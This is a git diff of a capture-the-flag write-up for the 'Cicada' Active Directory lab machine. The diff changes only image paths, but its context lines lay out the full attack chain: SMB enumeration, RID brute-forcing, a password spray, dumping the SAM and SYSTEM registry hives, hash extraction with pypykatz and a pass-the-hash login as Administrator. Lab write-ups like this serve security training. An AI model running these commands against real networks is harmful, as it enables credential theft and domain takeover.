@@ -1,6 +1,6 @@
 # Cicada
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Machine IP Address : 10.10.11.35
 
@@ -14,7 +14,7 @@ Start with Nmap Scan
 nmap -Pn -A -p- 10.10.11.35
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This seems to be an Active Directory box.
 
@@ -28,7 +28,7 @@ I started by enumerating SMB to see what access is available for guest/anonymous
 smbmap -H 10.10.11.35 -u 'anonymous'
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 First, I tried accessing each share. Using smbclient, I was able to access the HR share.
 
@@ -36,11 +36,11 @@ First, I tried accessing each share. Using smbclient, I was able to access the H
 smbclient \\\\10.10.11.35\\HR -U "anonymous"
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 "I used the `get` command in smbclient to transfer the 'Notice from HR.txt' file, which revealed a password."
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now that we have a password, let's see if any users are using it.
 
@@ -54,7 +54,7 @@ We try to find domain users by brute-forcing RIDs.
 nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I found several usernames, so I’ll try to validate them using the password we discovered. I put all the usernames in a text file and performed a password spray.
 
@@ -62,7 +62,7 @@ I found several usernames, so I’ll try to validate them using the password we 
 nxc smb 10.10.11.35 -u userrr.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We found a user who uses the password: 'michael.wrightson.
 
@@ -72,13 +72,13 @@ Next, I’ll look for a user with higher privileges.
 nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 And we found a user whose password is stored in the description
 
 Now, I ran `smbmap` to check if this user has access to more shares, and it turns out they do.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Checked the 'DEV' share and found a PowerShell script called 'Backup\_script.ps1.
 
@@ -91,7 +91,7 @@ Password for [WORKGROUP\david.orelious]:
 
 I listed the contents with the `ls`command , and `get`the Backup\_script.ps1
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Checking its contents revealed a new user, 'emily.oscars,' along with her password!
 
@@ -158,7 +158,7 @@ reg save HKLM\SAM C:\Users\emily.oscar.CICADA\Videos\sam
 reg save HKLM\SYSTEM C:\Users\emily.oscar.CICADA\Videos\system
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Download the files to your local machine, then use `pypykatz` to extract the hashes.
 
@@ -168,7 +168,7 @@ Using this command:
 pypykatz registry --sam sam system
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 With the extracted hash, we can now log in again. Instead of using the password, we'll use the `-H` option to authenticate with the hash.
 
@@ -180,8 +180,8 @@ Using this command:&#x20;
 evil-winrm -i 10.10.11.35  -u 'Administrator' -H 'hash'
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Logged in as the Administrator using the hash, located the `root.flag` file, and displayed its contents with `cat`. Challenge complete!
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
